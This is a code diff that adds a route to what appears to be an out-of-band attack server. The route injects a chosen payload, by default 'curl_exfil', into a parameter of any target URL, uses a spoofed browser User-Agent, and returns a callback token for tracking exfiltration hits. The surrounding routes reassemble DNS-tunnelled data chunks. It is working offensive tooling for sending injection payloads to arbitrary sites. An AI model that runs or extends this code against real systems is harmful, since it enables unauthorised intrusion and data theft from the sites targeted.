@@ -294,6 +294,111 @@ function receiveDnsChunk(req: Request, res: Response): void {
   res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64"));
 }
 
+/* ── POST /oob/activate — fire an OOB payload at a target URL ────── */
+router.post("/oob/activate", async (req: Request, res: Response) => {
+  const {
+    targetUrl,
+    payloadType = "curl_exfil",
+    injectParam = "q",
+    method      = "GET",
+    token:      reqToken,
+  } = req.body as {
+    targetUrl?:   string;
+    payloadType?: string;
+    injectParam?: string;
+    method?:      string;
+    token?:       string;
+  };
+
+  if (!targetUrl) {
+    res.status(400).json({ error: "targetUrl is required" });
+    return;
+  }
+
+  let parsedUrl: URL;
+  try { parsedUrl = new URL(targetUrl); }
+  catch { res.status(400).json({ error: "Invalid targetUrl — must be a full URL with scheme" }); return; }
+
+  const token   = reqToken || generateToken();
+  const cbBase  = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
+  const payloads = buildPolymorphicPayloads(cbBase, token);
+  const payload  = payloads[payloadType] ?? payloads["curl_exfil"] ?? "";
+  const cbUrl    = `${cbBase}/${token}`;
+
+  const httpMethod = method.toUpperCase() === "POST" ? "POST" : "GET";
+  const t0 = Date.now();
+  let status: "sent" | "error" | "timeout" = "sent";
+  let statusCode: number | null = null;
+  let responseBody = "";
+  let errorMsg: string | undefined;
+
+  try {
+    let fetchUrl: string;
+    let fetchInit: RequestInit;
+
+    if (httpMethod === "POST") {
+      fetchUrl = targetUrl;
+      fetchInit = {
+        method:  "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        },
+        body:   `${encodeURIComponent(injectParam)}=${encodeURIComponent(payload)}`,
+        signal: AbortSignal.timeout(12_000),
+      };
+    } else {
+      const u = new URL(parsedUrl.toString());
+      u.searchParams.set(injectParam, payload);
+      fetchUrl = u.toString();
+      fetchInit = {
+        method:  "GET",
+        headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
+        signal:  AbortSignal.timeout(12_000),
+      };
+    }
+
+    const r = await fetch(fetchUrl, fetchInit);
+    statusCode = r.status;
+    const ct = r.headers.get("content-type") ?? "";
+    if (ct.includes("text") || ct.includes("json")) {
+      responseBody = (await r.text()).slice(0, 512);
+    }
+  } catch (err) {
+    const e = err as Error;
+    if (e.name === "TimeoutError" || e.name === "AbortError") {
+      status   = "timeout";
+      errorMsg = "Request timed out after 12s — target may be filtering or slow";
+    } else {
+      status   = "error";
+      errorMsg = e.message;
+    }
+  }
+
+  const responseMs = Date.now() - t0;
+  log.info(
+    { targetUrl, payloadType, token: token.slice(0, 8), status, statusCode, responseMs },
+    "oob: activate fired",
+  );
+
+  res.json({
+    ok:          status !== "error",
+    token,
+    cbUrl,
+    payload,
+    payloadType,
+    targetUrl,
+    method:      httpMethod,
+    injectParam,
+    status,
+    statusCode,
+    responseMs,
+    responseBody,
+    error:       errorMsg,
+    hint:        "Watch the OOB listener for incoming callbacks on this token",
+  });
+});
+
 /* ── GET /oob/dns-sessions — list all reassembly sessions ─────────── */
 router.get("/oob/dns-sessions", (_req: Request, res: Response) => {
   const sessions = getSessions();
